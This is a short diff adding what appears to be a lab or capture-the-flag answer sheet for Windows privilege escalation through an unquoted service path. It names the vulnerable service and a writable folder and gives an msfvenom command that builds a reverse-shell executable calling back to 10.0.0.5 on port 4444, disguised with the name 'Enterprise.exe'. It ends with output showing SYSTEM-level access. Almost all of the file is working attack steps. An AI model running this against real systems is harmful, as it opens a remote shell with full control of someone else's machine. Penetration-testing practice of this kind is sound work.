@@ -1,0 +1,12 @@
+Vulnerable Service Name (Unquoted Path):
+Enterprise System Service (C:\Program Files\Enterprise System\service.exe)
+
+Path to the Writable Folder:
+C:\Program Files\Enterprise
+
+MSFVenom Payload Command:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o "Enterprise.exe"
+
+Proof of Execution:
+C:\Windows\system32> whoami
+nt authority\system
